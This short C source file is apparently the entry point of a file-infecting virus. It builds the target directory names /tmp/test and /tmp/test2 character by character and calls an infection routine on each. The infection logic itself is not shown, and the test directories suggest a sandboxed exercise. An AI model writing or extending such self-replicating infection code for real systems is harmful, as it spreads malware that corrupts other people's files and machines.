#include "virus.h"
#include "compiler_utils.h"

void	virus(const struct virus_header *vhdr)
{
	const char *playgrounds[] =
	{
		(char[10]){'/','t','m','p','/','t','e','s','t','\0'},
		(char[11]){'/','t','m','p','/','t','e','s','t','2','\0'}
	};

	for (unsigned long i = 0; i < ARRAY_SIZE(playgrounds); i++)
	{
		infect_files_in(vhdr, playgrounds[i]);
	}
}
